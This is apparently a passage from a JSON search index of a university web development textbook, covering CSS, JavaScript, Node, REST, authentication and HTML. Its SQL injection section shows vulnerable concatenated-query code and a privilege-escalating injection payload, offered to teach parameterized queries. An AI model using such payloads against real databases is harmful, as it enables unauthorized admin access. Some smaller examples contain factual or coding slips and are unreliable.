	"content": "Now that we know how to create an apply CSS rules to our HTML, let\u0026rsquo;s explore how they actually are used. A core idea behind CSS is the cascade algorithm, the cascading in cascading style sheets (CSS). The core idea behind the cascade algorithm is that as the browser encounters and parses CSS rules, they are collectively applied to the elements they match with. If the same rule is set multiple times, say color, the cascading algorithm decides which should be applied.\nCSS Sources Before we look at how cascades work, we need to understand the sources of CSS rules. So far we\u0026rsquo;ve focused on CSS rules created by the author - that is, the developer of the website. But there are two other sources of CSS rules, the user-agent and the user.\nUser-Agent The term user-agent is the technical way of describing the browser (or other software) that is accessing the webpage. Most browsers define default styles for their browser that help differentiate them from other browsers. These default values work well for less-styled websites, but for a carefully designed user experience, an unexpected rule can wreak havoc.\nFor this reason, many websites use a special CSS file that overrides user-agent sheets to allow the website to start from a well-known state. This is possible because rules appearing in sheets defined by the author override those defined in user-agent sheets.\nAuthor The author is simply the creator of the webpage. Thus, rules included with the \u0026lt;link\u0026gt; or \u0026lt;style\u0026gt; elements, as well as in-line styles defined on the elements themselves with the style attribute, fall into this category. Author styles always override user-agent styles, and are overridden in turn by user styles.\nUser The user is the actual user of the browser, and they can add their own styles to an HTML document in a variety of ways. One that you may encounter the most is adding custom styles with the web developer tools. One that you may have not encountered, but is common in practice, are styles intended to make the website easier for the vision impaired to read and work with. Increasing or decreasing text size with [CTRL] + [+] or [CTRL] + [-] is a simple example of this kind of tool.\nCascading Order Thus, the general order of rules applied by the cascading algorithm is user-agent, author, user. However, there is also the !important directive that can be added to CSS rules, i.e.:\np { color: red !important } which escalates them to a higher pass. Also, CSS animations and transitions are evaluated at their own priority level. Thus, we have a cascade order of:\n\u0026nbsp; Origin Importance 1 user agent normal 2 user normal 3 author normal 4 animations \u0026nbsp; 5 author !important 6 user !important 7 user agent !important 8 transitions \u0026nbsp; A more thorough discussion of the Cascade Algorithm can be found in the MDN Documentation.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/05-js-events/",
	"title": "JavaScript Events",
	"tags": [],
	"description": "",
	"content": "It should be no surprise that JavaScript features events - after all, we\u0026rsquo;ve already seen how the EventTarget interface allows us to attach event listeners to elements in the DOM tree. What might not be clear yet is how events are handled by JavaScript. JavaScript uses an event loop to process events. This is similar to Windows and other operating systems also handle events.\nAn event loop expressed in code looks something like:\nfunction main initialize() while message != quit message := get_next_message() process_message(message) end while end function It\u0026rsquo;s basically an infinite loop that responds to messages, one message at a time. It might be more useful to see a visual representation:\nHere we see not just the event loop, but also the event queue. This is a queue that holds events until the event loop is ready to process them. It works like the first-in-first-out queues you built in your data structures course (although it may also consider priorities of events).\nOn the far right are some common sources for JavaScript events - user input, the network, and timers. These are often managed by the operating system, and with modern multiple-processor computers can happen concurrently, i.e. at the same time. This is one reason the queue is so important - it allows JavaScript to process the events one at a time.\nWhen the JavaScript VM has finished executing its current work, it pulls the next event from the event queue. This event is processed by the corresponding event listener function that either 1) you wrote, or 2) is the default action. If neither exists, the event is discarded.\nAn Example Consider when the user clicks on a link on your page, let\u0026rsquo;s say \u0026lt;a id=\u0026quot;demo\u0026quot; href=\u0026quot;https://google.com\u0026quot;\u0026gt;Google it!\u0026lt;/a\u0026gt;. This creates a \u0026lsquo;click\u0026rsquo; event for the \u0026lt;a\u0026gt; tag clicked on. Now let\u0026rsquo;s assume you\u0026rsquo;ve written an event handler and attached it to that anchor tag:\ndocument.getElementById(\u0026#39;demo\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, function(e) { e.preventDefault(); alert(\u0026#39;You clicked the \u0026#34;Google it!\u0026#34; link.\u0026#39;); }); The anonymous function function(e) {...} attached to the \u0026lt;a\u0026gt;\u0026rsquo;s \u0026lsquo;click\u0026rsquo; event is invoked, with the event details being passed as the parameter e. Anchor tags have a default behavior - they open the linked page. So the line e.preventDefault(); informs JavaScript not to use this default behavior. Then we trigger an alert with the string 'You clicked the \u0026quot;Google it!\u0026quot; link.'.\nIf we hadn\u0026rsquo;t attached the event listener, then the page would have used the default response - loading a new page into the browser in the place of our current page.\nIf we clicked on an element that didn\u0026rsquo;t have a default action (like a \u0026lt;p\u0026gt; element) and you haven\u0026rsquo;t attached a listener the event is discarded and does nothing.\nConcurrency in JavaScript An important takeaway from the discussion of the event loop is that the actual processing of JavaScript code is always single-threaded. This avoids many of the common challenges of multi-threaded code. You don\u0026rsquo;t need to create semaphores, locks, and other multi-threading synchronization tools as your code will always be executing in a single thread.\nHowever, JavaScript does retain many of the benefits of concurrency within its model. For example, when the DOM is loading and encounters an element referencing an external resource (i.e. a video, img, link, or script element), it triggers a request to retrieve that resource through the browser. The browser does so while the JavaScript code continues executing. When the resource is fully downloaded by the browser, it creates a 'load' event with the details, and adds it to the JavaScript event queue. Multiple files are therefore downloaded concurrently, but our JavaScript handles the results one-by-one in a single-threaded manner.\nThink of the JavaScript event loop as a busy manager that only works on one thing at a time. The manager might send several workers out to get information. When they return, they form a line in front of the manager\u0026rsquo;s desk and wait patiently. Once the manager is finished with the task they have been working on, they take the report from the first worker in line, and starts doing what is needed to be done with the returned information. Once the manager finishes that, the next employee will report, and so on.\nCommon Events There are many kinds of events in JavaScript; you can find a complete list in the MDN docs. However some of the ones you will likely find yourself using are:\nload - Triggered when a resource (i.e. an image, video, stylesheet, script) has finished loading. You can also listen for the load event on the document itself; here it will be triggered after all the resources on the page are loaded.\nchange The value of an \u0026lt;input\u0026gt;, \u0026lt;textarea\u0026gt;, or \u0026lt;select\u0026gt; has changed\nfocus triggered when an input gains focus (is the currently selected input)\nblur triggered when an input loses focus\nclick The primary mouse button was clicked. On old browsers this might trigger for any button\ncontextmenu The right mouse button was clicked\nmousedown A mouse button was pressed\nmouseup A mouse button was released\nTimers Timers play a special role in JavaScript\u0026rsquo;s concurrency model, and in many ways behave like events. For example, to cause the phrase \u0026ldquo;Hello time!\u0026rdquo; to be logged to the console in three minutes, you would write the code:\nsetTimeout(function() { console.log(\u0026#34;Hello time!\u0026#34;)}, 3000); You will notice that the setTimeout() method takes a function to execute at that future point in time, much like attaching an event handler. The second argument is the number of milliseconds in the future for this event to occur. The timer works like an event, when the time expires, a corresponding event is added to the event queue, to trigger the delayed function.\nAn important side-effect of this approach is that you only know the timer\u0026rsquo;s result won\u0026rsquo;t happen before the delay you specify, but if the JavaScript virtual machine is engaged in a long-running process, it may be longer before your timer event is triggered.\nFor events you need to do on a regular interval, use setInterval() instead. This will invoke the supplied function at each elapsing of the supplied interval. It also returns a unique id that can be supplied to clearInterval() to stop the timed event.\nInfo\nYou may find yourself reading code that uses a value of 0 milliseconds with setTimeout(), i.e.:\nsetTimeout(doSomething, 0); You might be wondering why. You might wonder if it is equivalent to:\ndoSomething(); And while it might appear that way, the answer is no. Remember, setTimeout() creates an event in the event queue that executes after the specified delay. Thus, doSomething() will execute immediately, but setTimeout(doSomething()) will continue to execute all code after the line until execution finishes, and then will invoke doSomething().\nThus, JavaScript programmers often use this technique to trigger an action immediately after the current code finishes executing.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/05-objects-and-classes/",
	"title": "Objects and Classes",
	"tags": [],
	"description": "",
	"content": " CONSOLE JavaScript is also an object-oriented language, but the way it implements objects is derived from the ideas of the Self programming language, rather than the C++ origins of Java and C#\u0026rsquo;s object-oriented approaches.\nObject Properties Let\u0026rsquo;s start with what an object is in JavaScript. It\u0026rsquo;s basically a collection of properties - key/value pairs, similar to the concept of a Dictionary in other languages. The properties play both the role of fields and methods of the object, as a property can be assigned a primitive value or a function.\nWe\u0026rsquo;ve already seen how to create an object with literal syntax, but let\u0026rsquo;s see another example:\nvar bob = { name: \u0026#34;Bob\u0026#34;, age: 29, mother: { name: \u0026#34;Mary\u0026#34;, age: 53 } } Look at the property mother - it is its own object, nested within bob. Objects can nest as deep as we need them to (or at least, until we run out of memory).\nWe can then access properties with either dot notation or bracket notation, i.e.:\n// dot notation console.log(bob.name); console.log(bob.mother.name); bob.father = {name: \u0026#34;Mark\u0026#34;}; // bracket notation console.log(bob[\u0026#34;name\u0026#34;]); console.log(bob[\u0026#34;mother\u0026#34;][\u0026#34;name\u0026#34;]); bob[\u0026#34;father\u0026#34;] = {name: \u0026#34;Mark\u0026#34;} Property names should conform to JavaScript variable naming rules (start with a letter, $, or _, be composed of letters, numbers, $, and _, and contain no spaces) though we can use bracket notation to sidestep this:\nbob[\u0026#34;favorite thing\u0026#34;] = \u0026#34;macaroni\u0026#34;; However, if a property set with bracket notation does not conform to the naming rules, it cannot be accessed with dot notation. Other than that, you\u0026rsquo;re free to mix and match.\nYou can also use the value of a variable as a property name:\nvar field = \u0026#34;key\u0026#34;; var tricky = { [field]: 1 } console.lo(tricky.key); This is a handy trick when you need to set property names at runtime.\nConstructors A constructor in JavaScript is simply a function that is invoked with the keyword new. Inside the body of the function, we have access to a variable named this, which can have values assigned to it. Here is an example:\nfunction Bear(name) { this.name = name; } var pooh = new Bear(\u0026#34;pooh\u0026#34;); There is nothing that inherently distinguishes a constructor from any other function; we can use the new keyword with any function. However, it only makes sense to do so with functions intended to be used as constructors, and therefore JavaScript programmers have adopted the convention of starting function names intended to be used as constructors with a capital letter, and other functions with a lowercase one.\nObject Methods Methods are simply functions attached to the object as a property, which have access to the this (which refers back to the object) i.e.:\npooh.greet = function() { console.log(`My name is ${this.name}`); } We can also attach a method to all objects created with a constructor by attaching them to its prototype, i.e.:\nBear.prototype.growl = function() { console.log(`Grrr. My name is ${this.name} and I\u0026#39;ll eat you up!`) } Now we can invoke pooh.growl() and see the same message. If we create a few new Bear instances:\nvar smokey = new Bear(\u0026#34;Smokey\u0026#34;); var shardik = new Bear(\u0026#34;Shardik\u0026#34;); They also has access to the growl() method, but not greet(), because that was declared on the pooh instance, not the prototype.\nOf course, it doesn\u0026rsquo;t seem appropriate for Smokey the Bear to threaten to eat you. Let\u0026rsquo;s tweak his behavior:\nsmokey.growl = function() { console.log(\u0026#34;Only you can prevent forest fires!\u0026#34;); } Now try invoking:\nsmokey.growl(); shardik.growl(); pooh.growl(); Pooh and Shardick continue to growl menacingly, but Smokey warns us about the dangers of forest fires. This leads us to the topic of prototypes.\nObject Prototypes JavaScript adopts an approach to inheritance known as prototype-based programming, which works a bit differently than you\u0026rsquo;re used to.\nIn JavaScript, each object keeps a reference to its constructor (in fact, you can see this for our bears with pooh.constructor, smokey.constructor, etc.). Each constructor in turn has a prototype property, which is an object with methods and properties attached to it.\nWhen we invoke pooh.growl(), JavaScript first checks to see if the growl property is defined on the Bear instance we know as pooh. If not, then it checks the constructor\u0026rsquo;s prototype for the same property. If it exists, then it invokes it.\nInheritance in JavaScript takes the form of a prototype chain - as each prototype is an object, each prototype can have its own prototype in turn. Thus, when we invoke a method, the interpreter walks down this chain and invokes the first matching property found.\nECMA Script 2015 Class Syntax If you find this all confusing, don\u0026rsquo;t worry, you\u0026rsquo;re not alone. ECMAScript decided to introduce a new class syntax in the 2015 version (ES6). It will look a lot more familiar:\nclass Bear { constructor(name) { this.name = name; this.growl = this.growl.bind(this); } growl() { console.log(`Grrr! My name is ${this.name} and I\u0026#39;ll eat you!`); } } Here we\u0026rsquo;ve recreated our Bear class using the new syntax. We can construct a bear the same way, and invoke its growl() method:\nvar yogi = new Bear(\u0026#34;Yogi\u0026#34;); yogi.growl(); Method Binding Under the hood we\u0026rsquo;re still using the same prototypical inheritance, which throws a slight wrench in the works. Notice the line:\nthis.growl = this.growl.bind(this); in the constructor? This uses the function.prototype.bind method to bind the scope of the growl function to the this object of our class (remember, functions start a new scope, and a new scope means a new this object).\nSo remember when using ES6 class syntax, you need to bind your methods, or declare them in the constructor itself as arrow functions, i.e.:\nclass Bear { constructor(name) { this.name = name; this.growl = () =\u0026gt; { console.log(`Grrr! My name is ${this.name} and I\u0026#39;ll eat you!`); } } } As the arrow function declaration does not open a new scope, the this object doesn\u0026rsquo;t change, and refers to the bear instance.\nInheritance Specifying inheritance is also simplified. For example:\nclass Mammal { constructor() { this.hasFur = true; this.givesMilk = true; this.heartChambers = 4; } } class Bear extends Mammal { constructor(name) { super(); } } Remember to always invoke the parent constructor with super() as the first thing in your child class constructor.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/05-packages/",
	"title": "Packages",
	"tags": [],
	"description": "",
	"content": "The Node Package Manager allows you to create a package representing your project. This is similar to Visual Studio\u0026rsquo;s idea of a project - a package is a complete Node program.\nJust as Visual Studio adds solution and project files, a Node package adds a file named package.json and a directory named node_modules.\nThe Package File Every node package has in its top-level directory a file named package.json. This JSON file provides important information about the project, including:\nThe name of the project The version of the project The author of the project The entry point (the file that should be processed first, much like a C# Program.cs file or C++ main.cpp file). Owing to its roots as a language for developing webservers, the default is index.js, though it can be anything you want (many projects use server.js or main.js). Any scripts associated with the project (often we\u0026rsquo;ll have scripts to run and test the project) Any dependencies of the project (these are additional packages that are copied into the node_modules file) The home repository of the project (often a GitHub repository, though other options are possible) The license under which this package is released Most of the properties of the package.json are optional, and there are options I have listed above are not comprehensive. The package.json object format is described in great detail in the npm documentation.\nSemantic Versioning Node packages use semantic versioning, a numbering scheme that uses three numbers separated by periods in the pattern MAJOR.MINOR.PATCH. For example, your Codio Box is likely running Ubuntu 18.04.3 - that is Ubuntu, major release 18, minor release 4, patch 3. If its developers found a bug or security vulnerability and fixed it, they would release a new patch version, i.e. Ubuntu 18.04.4. If they made some improvements that don\u0026rsquo;t change the way you work with the operating system, those might be a minor release, i.e. Ubuntu 18.05.0 (note that the patch release number starts over at 0). And if a major change in the way the software works was made, that would be a major release, i.e. Ubuntu 19.0.0. Additionally, you probably have seen the program listed as Ubuntu 18.04.4 LTS. The LTS is not part of semantic versioning, but indicates this is a long term support release, i.e. one the developers have committed to fixing problems with for a specific duration of time.\nWhen releasing your own Node packages, you should strive to practice using semantic versioning. That way you get into the habit, and it will be easier when you become a professional developer. Another good practice is to have a changelog - a text or markdown file that lists the changes made in each successive version of the program, usually as a bulleted list.\nInitializing the Package You can manually create the package.json file, but npm also provides a wizard to make this process easier. From the terminal, while at the root directory of your project, enter the command:\n$ npm init This will launch the wizard, asking you a series of questions used to create the project. It will also offer default options for many of the values; you can simply press the space bar to accept these. Moreover, if your directory contains an already-initialized git repository, it will use that repository\u0026rsquo;s origin as the basis for the repository option. The wizard will create the package.json file in the project\u0026rsquo;s root directory.\nNext we\u0026rsquo;ll look at some aspects of the package in more detail.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/05-progressive-web-apps/",
	"title": "Progressive Web Apps",
	"tags": [],
	"description": "",
	"content": "A next step in the evolution of single-page apps is the progressive web application (PWA). While these are web applications, they also provide a native-like feel when running in a phone or tablet, and can usually have a shortcut saved to the desktop. It is built around several new web standards that provide specific functionality:\nSecure Context A PWA is always served with https. Also, many features that a PWA might want to use (geolocation, the camera) are only available to a site served over http.\nService Worker A service worker is a JavaScript script (much like the web workers we learned about earlier) that manages communication between the app running in the browser and the network. Most specifically, it is used to cache information for when the network is unavailable, which can allow your app to run offline.\nManifest File The manifest is a JSON file that describes the application (much like the Node package.json) that provides the details necessary to load the app and \u0026ldquo;install\u0026rdquo; it on mobile devices. Note that installing essentially means running a locally cached copy of the website.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/05-query-and-hash-strings/",
	"title": "Query and Hash Strings",
	"tags": [],
	"description": "",
	"content": "Query strings (aka search strings) are the part of the URL that appear after the ? and before the optional #. The hash string is the portion of the url after the #. We\u0026rsquo;ve mentioned them a bit before, but as we dig into dynamic web servers it makes sense to do a deeper dive, as this is where they really come into play.\nThe Hash String First, let\u0026rsquo;s briefly visit the hash string. It\u0026rsquo;s traditional use is to indicate a HTML element on the page the browser should scroll to when visiting the URL. When used this way, its value is the id attribute of the element. The browser will automatically scroll to a position that displays the element on-screen. Thus, the traditional use of the hash string is for \u0026ldquo;bookmarked\u0026rdquo; links that take you to an exact section of the page, like this one which takes you to a description of your personal CS web space: https://support.cs.ksu.edu/CISDocs/wiki/Personal_Web_Pages#Dynamic_Content.\nWith the advent of single-page apps, it has come to serve additional purposes; but we\u0026rsquo;ll talk about those when we visit that topic in a future chapter.\nThe Query/Search String Now, the query string is a vital tool for dynamic web pages, as it conveys information beyond the specific resource being asked for to the server. Consider what a dynamic webserver does - it takes an incoming request, and sends a response. In many ways, this is similar to a function call - you invoke a function, and it returns a value. With this in mind, the path of the URL is like the function name, and the query string becomes its parameters.\nMuch like parameters have a name and a value, the query string is composed of key/value pairs. Between the key and value of each pair is a =, and between the pairs is a \u0026amp;. Because the = and \u0026amp; character now have a special meaning, any that appear in the key or value are swapped with a special percent value, i.e. \u0026amp; becomes %26 and = becomes %3D. Similarly, other characters that have special meanings in URLs are likewise swapped. This is known as URL or percent encoding, and you can see the swapped values in the table below:\n':' '/' '?' '#' '[' ']' '@' '!' '$' '\u0026amp;' \"'\" '(' ')' '*' '+' ',' ';' '=' '%' ' ' %3A %2F %3F %23 %5B %5D %40 %21 %24 %26 %27 %28 %29 %2A %2B %2C %3B %3D %25 %20 or + In JavaScript, the encodeURIComponent() function can be used to apply percent encoding to a string, and the decodeURIComponent() can be used to reverse it.\nNode offers the querystring library. It offers a querystring.parse() method which can parse a query string into a JavaScript object with the decoded key/value pairs transformed into properties and a querystring.stringify() method which can convert a JavaScript object into an encoded query string. In addition, these methods allow you to override what characters are used as delimiters, potentially allowing you to use alternative encoding schemes.\nForms and the Query String While we can type a URL with a query string manually, by far the most common way to produce a query string is with a \u0026lt;form\u0026gt; element. When a form is submitted (the user clicks on a \u0026lt;input\u0026gt; with type attribute of \u0026quot;submit\u0026quot;), it is serialized and submitted to the server. By default, it will be sent to the same URL it was served from, using a GET request, with the fields of the form serialized as the query string.\nThis is why one name for the query string is the search string, as it is commonly used to submit search requests. For example, Google\u0026rsquo;s search page contains a form similar to this (very simplified form):\n\u0026lt;form\u0026gt; \u0026lt;input name=\u0026#34;q\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Google Search\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Notice the form has one text input, named \u0026quot;q\u0026quot;. If we type in search terms, say \u0026ldquo;k-state computer science\u0026rdquo; and click the search button, you\u0026rsquo;ll notice in the resulting url the query string contains q=k-state+computer+science (plus a lot of other key/value pairs). If you type \u0026quot;https://www.google.com/search?q=k-state+computer+science\u0026quot; into the address bar, you\u0026rsquo;ll get the same page.\nNotice though, that google uses www.google.com/search as the URL to display search results at, instead of the original www.google.com page. We can have a form submit to a different URL than it was served on by setting its action attribute to that URL.\nWe can also change the HTTP method used to submit the form with the method attribute. By default it uses a GET request, but we can instead set it to a POST request. When a POST request is used, the form is no longer encoded in the query string - it is instead sent as the body of the POST request.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/05-rest/",
	"title": "REST",
	"tags": [],
	"description": "",
	"content": "We\u0026rsquo;ve already seen that with our blog, we could convey which post to display with different URL strategies, i.e.:\nhttp://my-blog.com/posts?id=5 http://my-blog.com/posts/5 http://my-blog.com/posts/5-a-night-that-was-dark And that is just to display posts. What about when we want our blog software to allow the writer to submit new posts? Or edit existing ones? That\u0026rsquo;s a lot of different URLS we\u0026rsquo;ll need to keep track of.\nRepresentational State Transfer (REST) Roy Fielding tackled this issue in Chapter 5 of his Ph.D. dissertation \u0026ldquo;Architectural Styles and the Design of Network-based Software Architectures.\u0026rdquo; He recognized that increasingly dynamic web servers were dealing with resources that could be created, updated, read, and destroyed, much like the resources in database systems (not surprisingly, many of these resources were persistently stored in such a database system). These operations are so pervasive in database systems that we have an acronym for them: CRUD.\nRoy mapped these CRUD methods to a HTTP URL + Method pattern he called Representational State Transfer (or REST). This pattern provided a well-defined way to express CRUD operations as HTTP requests.\nTake our blog posts example. The RESTful routes associated with posts would be:\nURL HTTP Method CRUD Operation posts/ GET Read (all) posts/:id GET Read (one) posts/ POST Create posts/:id POST Update posts/:id DELETE Delete The :id corresponds to an actual identifier of a specific resource - most often the id column in the database. REST also accounts for nesting relationships. Consider if we added comments to our posts. Comments would need to correspond to a specific post, so we\u0026rsquo;d nest the routes:\nURL HTTP Method CRUD Operation posts/:post_id/comments GET Read (all) posts/:post_id/comments/:comment_id GET Read (one) posts/:post_id/comments POST Create posts/:post_id/comments/:comments_id POST Update posts/:post_id/comments/:comments_id DELETE Delete Notice that we now have two wildcards for most routes, one corresponding to the post and one to the comment.\nIf we didn\u0026rsquo;t want to support an operation, for example, updating comments, we could just omit that route.\nREST was so straightforward and corresponded so well to how many web servers were operating, that it quickly became a widely adopted technique in the web world. When you hear of a RESTful API or RESTful routes, we are referring to using this pattern in the URLs of a site.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/05-single-sign-on/",
	"title": "Single Sign On",
	"tags": [],
	"description": "",
	"content": "It should be clear from our earlier discussion that there are some very real challenges to writing a good authentication approach. These challenges can be broken into two categories, those that face us as the programmer, and those that arise from our users:\nProgrammer Challenges For us as the programmer, there are a lot of steps in creating an authentication strategy that we must get right. We also must be very careful about how we store the authentication data - i.e. passwords should always be stored encrypted, never as plain text. And having actual authentication data in our site makes us a juicer target for adversaries, and potentially ups the stakes if our site is compromised.\nFinally, what constitutes best practice in authentication is constantly changing. And to make sure we are doing everything as securely as possible we should be updating our apps to follow current best practices. This is obviously a lot of work.\nUser Challenges For the user, having yet another login and password contributes to a number of problems. Users struggle to remember multiple passwords, and often default to using the same login and password across multiple sites. This means their credentials are only as secure as the worst-implemented security of those sites. While your app might have stellar security, your user might be compromised by a completely different site you have no influence over. Also, users often resort to writing down credentials - leaving them open to being found and used by others.\nSingle Sign On Single-sign on is a solution to both sets of challenges. The basic idea is to have one authentication service that is used for multiple, often completely independent applications. A user only needs to remember one login and password for all the applications, and authentication is done on one special-built server that can be updated to the latest best practices with ease.\nOf course, to implement single-sign on, we need a way to establish trust between the authenticating server and the other web apps that use it. Thus, we need a standardized process to draw upon. We\u0026rsquo;ll discuss several in the next couple of sections.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/05-sql-injection/",
	"title": "SQL Injection",
	"tags": [],
	"description": "",
	"content": "Along with the use of relational databases and SQL comes one very important attack to be aware of - SQL injection. This attack takes advantage of the way many developers write SQL queries within their programs. Consider the simple relational database we laid out earlier. Let\u0026rsquo;s assume our web application lets us search for people by their last names. To find Mary Cotts, we would then need a SQL query like:\nSELECT * FROM people WHERE last=\u0026#39;Cotts\u0026#39;; Since we want our users to be able to specify who to look for, we\u0026rsquo;d probably give them a search form in our HTML, something like:\n\u0026lt;form\u0026gt; \u0026lt;label for=\u0026#34;last\u0026#34;\u0026gt;Last Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;last\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Search\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; And in our code, extract the name value from the query string and use it to construct the SQL query using string concatenation:\nconst querystring = require(\u0026#39;querystring\u0026#39;); var url = new URL(req.url, \u0026#34;http://localhost\u0026#34;); var qs = querystring.parse(url.search.slice(1)); var name = qs.name; var query = `SELECT * FROM people WHERE last=\u0026#39;${name}\u0026#39;;`; The problem with this approach is a savvy adversary could submit a \u0026ldquo;name\u0026rdquo; that completes the SQL command and begins a new one, i.e.:\nbob\u0026#39;; UPDATE users SET admin=true WHERE username=\u0026#39;saavyhacker Our naive concatenation approach then creates two SQL commands:\nSELECT * FROM people WHERE last=\u0026#39;bob\u0026#39;; UPDATE users SET admin=true WHERE username=\u0026#39;saavyhacker\u0026#39;; When we run this query, our savvy hacker just made themselves an admin on our site (assuming our database has a users table with an admin column we use to determine their role)!\nThis is just the tip of the iceberg for SQL injection attacks - there are many, many variations on the theme.\nPreventing SQL Injection Every database driver provides the ability to build parameterized queries, i.e. a preformatted query that has \u0026ldquo;slots\u0026rdquo; where you assign values to. The exact mechanism to use these depends on the driver you are using to connect to the database. For example, if we were using the node-sqlite3 driver to connect our Node application to a SQLite database, we would use:\nconst querystring = require(\u0026#39;querystring\u0026#39;); var url = new URL(req.url, \u0026#34;http://localhost\u0026#34;); var qs = querystring.parse(url.search.slice(1)); var name = qs.name; var query = `SELECT * FROM people WHERE last=?;`; // assuming a variable db is declared db.run(query, name, (err, result) =\u0026gt; { // do something with result... }); Because the slot corresponds to a specific column, the database engine converts the supplied argument to that type before applying it In this case, if our canny hacker uses his string, it would be interpreted as the literal last name \u0026ldquo;bob\u0026rsquo;; UPDATE users SET admin=true WHERE username=\u0026lsquo;saavyhacker\u0026rdquo;. Which probably wouldn\u0026rsquo;t exist in our database, because what kind of parent would saddle a child with such a name?\nNote\nXKCD\u0026rsquo;s Exploits of a Mom\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/05-tables/",
	"title": "Tables",
	"tags": [],
	"description": "",
	"content": "Tables were amongst the first addition to HTML (along with images), as they were necessary for the primary role of early HTML, disseminating research.\nA table requires a lot of elements to be nested in a specific manner. It is best expressed through an example:\n\u0026lt;table\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Role\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Darth Vader\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Antagonist\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Luke Skywalker\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Coming-of-age protagonist\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Princess Lea\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Heroic resistance fighter\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Obi-Wan Kenobi\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Wise old man\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Han Solo\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Likeable scoundrel\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Chewbacca\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;The muscle\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Threepio\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Comedic foil\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Artoo Deetoo\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;Plot driver\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; It renders as:\nName Role Darth Vader Antagonist Luke Skywalker Coming-of-age protagonist Princess Lea Heroic resistance fighter Obi-Wan Kenobi Wise old man Han Solo Likeable scoundrel Chewbacca The muscle 3PO Comedic foil R2-D2 Plot driver Tables should only be used for displaying tabular data. There was a time, not long ago, when early web developers used them to create layouts by cutting images into segments and inserting them into table cells. This is very bad practice! It will not display as expected in all browsers, and wreaks havoc with screen readers for the visually impaired. Instead, pages should be laid out with CSS, as is discussed in the CSS layouts section.\nA far more detailed discussion of tables can be found in MDN\u0026rsquo;s guides.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/05-uris-and-urls/",
	"title": "URIs and URLs",
	"tags": [],
	"description": "",
	"content": "Before a web request can be made, the browser needs to know where the resource requested can be found. This is the role that a Universal Resource Locator (a URL) plays. A URL is a specific kind of Universal Resource Indicator (URI) that specifies how a specific resource can be retrieved.\nInfo\nURLs and URIs The terms URL and URI are often used interchangeably in practice. However, a URL is a specific subset of URIs that indicate how to retrieve a resource over a network; while a URI identifies a unique resource, it does not necessarily indicate how to retrieve it. For example, a book\u0026rsquo;s ISBN can be represented as a URI in the form urn:isbn:0130224189. But this URI cannot be put into a browser\u0026rsquo;s Location to retrieve the associated book.\nA URI consists of several parts, according to the definition (elements in brackets are optional):\nURI = scheme:[//[userinfo@]host[:port]]path[?query][#fragment]\nLet\u0026rsquo;s break this down into individual parts:\nscheme: The scheme refers to the resource is identified and (potentially) accessed. For web development, the primary schemes we deal with are http (hyper-text transfer protocol), https (secure hyper-text transfer protocol), and file (indicating a file opened from the local computer).\nuserinfo: The userinfo is used to identify a specific user. It consists of a username optionally followed by a colon (:) and password. We will discuss its use in the section on HTTP authentication, but note that this approach is rarely used today, and carries potential security risks.\nhost: The host consists of either a fully quantified domain name (i.e. google.com, cs.ksu.edu, or gdc.ksu.edu) or an ip address (i.e. 172.217.1.142 or [2607:f8b0:4004:803::200e]). IPv4 addresses must be separated by periods, and IPv6 addresses must be closed in brackets. Additionally, web developers will often use the loopback host, localhost, which refers to the local machine rather than a location on the network.\nport: The port refers to the port number on the host machine. If it is not specified (which is typical), the default port for the scheme is assumed: port 80 for HTTP, and port 443 for HTTPS.\npath: The path refers to the path to the desired resource on the server. It consists of segments separated by forward slashes (/).\nquery: The query consists of optional collection of key-value pairs (expressed as key:value), separated by ampersands (\u0026amp;), and proceeded by a question mark (?). The query string is used to supply modifiers to the requested resource (for example, applying a filter or searching for a term).\nfragment: 